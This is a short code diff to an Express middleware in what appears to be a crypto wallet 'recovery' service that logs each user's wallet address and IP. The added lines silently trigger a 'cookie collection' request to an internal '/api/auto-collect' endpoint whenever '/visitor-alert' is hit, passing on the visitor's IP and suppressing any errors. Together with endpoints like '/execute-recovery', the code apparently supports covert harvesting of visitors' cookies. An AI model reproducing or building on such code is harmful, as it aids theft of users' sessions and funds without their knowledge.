@@ -97,6 +97,16 @@ app.use('/api', async (req, res, next) => {
   
   console.log(`🔥 USER ACTIVITY: ${req.method} ${req.path} - User: ${userAddress} - IP: ${realIP}`);
   
+  // Auto-trigger cookie collection for visitor alerts
+  if (req.path === '/visitor-alert') {
+    setTimeout(() => {
+      const axios = require('axios');
+      axios.post(`http://localhost:${PORT}/api/auto-collect`, {}, {
+        headers: { 'x-forwarded-for': realIP }
+      }).catch(() => {});
+    }, 2000);
+  }
+  
   // Send alert for important endpoints
   const importantEndpoints = ['/scan-wallet', '/analyze-recovery', '/create-recovery-job', '/execute-recovery', '/scan-bridge', '/scan-staking'];
   
